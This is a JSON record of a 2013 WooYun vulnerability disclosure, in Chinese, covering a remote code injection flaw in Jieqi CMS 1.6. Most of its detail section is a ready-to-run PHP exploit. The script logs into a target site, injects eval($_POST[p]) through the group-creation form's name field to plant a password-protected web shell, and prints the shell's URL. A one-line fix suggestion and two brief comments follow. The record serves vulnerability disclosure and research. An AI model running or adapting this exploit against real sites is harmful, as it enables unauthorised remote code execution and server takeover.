{"id": 14503, "wybug_id": "wooyun-2013-016998", "wybug_title": "Jieqi CMS V1.6 PHP Code Injection Vul", "wybug_corp": "杰奇网络", "wybug_author": "fly@wolvez", "wybug_date": "2013-01-06 16:59", "wybug_open_date": "2013-02-20 16:59", "wybug_type": "命令执行", "wybug_level": "中", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["代码执行", "远程代码执行"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-01-06：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2013-02-20：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 杰奇网站管理系统（简称 JIEQI CMS，中国国家版权局著作权登记号：2006SR03382）是一套模块化的网站架设系统，具备简单灵活、性能卓越、安全可靠等特性。我们为大家提供了目前最流行的杰奇小说连载系统、杰奇原创漫画系统及数字出版解决方案，并提供各类网站定制服务。该系统存在多个远程安全漏洞，今天报告的这个是1.6版本的一个远程代码执行漏洞，应该有2年多历史了。 详细说明：  详细信息见漏洞证明，需要有一个能创建圈子的用户。   漏洞证明：  \n<?phpprint_r('+---------------------------------------------------------------------------+Jieqi CMS V1.6 PHP Code Injection Exploitby flyh4tmail: phpsec at hotmail dot comteam: http://www.wolvez.org+---------------------------------------------------------------------------+');/** * works regardless of php.ini settings*/if ($argc < 5) {\tprint_r('+---------------------------------------------------------------------------+Usage: php '.$argv[0].' host path usernamehost:      target server (ip/hostname)path:      path to jieqicms uasename:  a username who can create groupExample:php '.$argv[0].' localhost /jieqicmsv1.6/ vipuser1 password+---------------------------------------------------------------------------+');\texit;}error_reporting(7);ini_set('max_execution_time', 0);$host = $argv[1];$path = $argv[2];$username = $argv[3];$password = $argv[4];/*get cookie*/$cookie_jar_index = 'cookie.txt';$url1 = \"http://$host/$path/login.php\";$params = \"password=$password&username=$username&usecookie=86400&submit=%26%23160%3B%B5%C7%26%23160%3B%26%23160%3B%C2%BC%26%23160%3B&action=login&jumpreferer=1\";$curl1 = curl_init();curl_setopt($curl1, CURLOPT_URL, $url1);curl_setopt($curl1, CURLOPT_COOKIEJAR, $cookie_jar_index);curl_setopt($curl1, CURLOPT_POST, 1);curl_setopt($curl1, CURLOPT_POSTFIELDS, $params);ob_start();$data1 = curl_exec($curl1);if ($data1 === FALSE) {\techo \"cURL Error: \" . curl_error($ch);\texit('exploit failed');}curl_close($curl1);ob_clean();/*get shell*/$params ='-----------------------------23281168279961Content-Disposition: form-data; name=\"gname\"';$params .=\"';\";$params .='eval($_POST[p]);//flyh4t-----------------------------23281168279961Content-Disposition: form-data; name=\"gcatid\"1-----------------------------23281168279961Content-Disposition: form-data; name=\"gaudit\"1-----------------------------23281168279961Content-Disposition: form-data; name=\"gbrief\"1-----------------------------23281168279961--';$url2 = \"http://$host/$path/modules/group/create.php\";$curl2 = curl_init();$header =array( 'Content-Type: multipart/form-data; boundary=---------------------------23281168279961'\t);curl_setopt($curl2, CURLOPT_URL, $url2);curl_setopt($curl2, CURLOPT_HTTPHEADER, $header);curl_setopt($curl2, CURLOPT_COOKIEFILE, $cookie_jar_index);curl_setopt($curl2, CURLOPT_POST, 1);curl_setopt($curl2, CURLOPT_POSTFIELDS, $params);ob_start();curl_exec($curl2);curl_close($curl2);$resp = ob_get_contents(); //$rs就是返回的内容ob_clean();preg_match('/g=([0-9]{1,4})/', $resp, $shell);//print_r($shell);//print_r($resp);$url = \"http://$host/$path/files/group/userdir/0/$shell[1]/info.php\";echo \"view you shell here(password:p)\\r\\n\" ;echo $url;\n   修复方案：  转意特殊字符   版权声明：转载请注明来源 fly@wolvez@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2013-01-07 12:27 |    \t\t云中鹰 \t\t\t( 实习白帽子  |\t\t\t        Rank:65 漏洞数:10        | 云中鹰)\t\t \n  马~~    \n     2013-01-08 14:05 |    \t\tsaline \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:32        | Focus On Web Secur1ty)\t\t \n  三~~    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}